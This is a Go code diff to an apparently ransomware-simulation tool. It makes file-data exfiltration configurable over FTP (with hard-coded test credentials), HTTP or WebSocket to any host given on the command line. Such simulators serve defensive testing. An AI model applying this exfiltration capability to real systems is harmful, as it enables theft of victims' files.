@@ -2,6 +2,7 @@ package main
 
 import (
 	"os"
+	"strings"
 	"time"
 
 	"gitlab.com/mjwhitta/cli"
@@ -58,13 +59,27 @@ func main() {
 		}
 	}
 
-	if flags.exfil {
+	if flags.exfil != "" {
 		sim.ExfilFilenames = true
 		sim.ExfilThreshold = flags.threshold
-		sim.Exfil = rw.HTTPExfil(
-			"http://localhost:8080",
-			map[string]string{},
-		)
+
+		if strings.HasPrefix(flags.exfil, "ftp") {
+			sim.Exfil, e = rw.FTPParallelExfil(
+				flags.exfil,
+				"ftptest",
+				"ftptest",
+			)
+		} else if strings.HasPrefix(flags.exfil, "http") {
+			sim.Exfil, e = rw.HTTPExfil(
+				flags.exfil,
+				map[string]string{},
+			)
+		} else if strings.HasPrefix(flags.exfil, "ws") {
+			sim.Exfil, e = rw.WebsocketParallelExfil(flags.exfil)
+		}
+		if e != nil {
+			panic(e)
+		}
 	}
 
 	// Add targets
